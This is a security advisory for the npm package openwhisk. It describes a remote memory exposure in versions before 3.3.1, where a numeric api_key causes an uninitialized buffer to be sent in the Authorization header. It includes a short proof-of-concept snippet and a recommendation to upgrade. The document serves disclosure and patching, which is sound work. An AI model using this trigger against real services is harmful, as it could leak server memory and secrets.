# [M] Remote Memory Exposure in openwhisk

## Summary
Severity: Medium
Advisory: GHSA-53mj-mc38-q894
Ecosystem: npm
Published: 2020-09-01
Source: https://github.com/advisories/GHSA-53mj-mc38-q894
Type: github-advisory

## Affected
- npm: `openwhisk` — affected >=0 <3.3.1

## Details
Versions of `openwhisk` before 3.3.1 are vulnerable to remote memory exposure.

When a number is passed to `api_key`, affected versions of `openwhisk` allocate an uninitialized buffer and send that over network in Authorization header (base64-encoded).

Proof of concept:

```js
var openwhisk = require('openwhisk');
var options = {
  apihost: '127.0.0.1:1433', 
  api_key: USERSUPPLIEDINPUT // number
};
var ow = openwhisk(options);
ow.actions.invoke({actionName: 'sample'}).then(result => console.log(result))
```


## Recommendation

Update to version 3.3.1 or later.

## References
- https://github.com/openwhisk/openwhisk-client-js/pull/34
- https://github.com/openwhisk/openwhisk-client-js
- https://www.npmjs.com/advisories/600
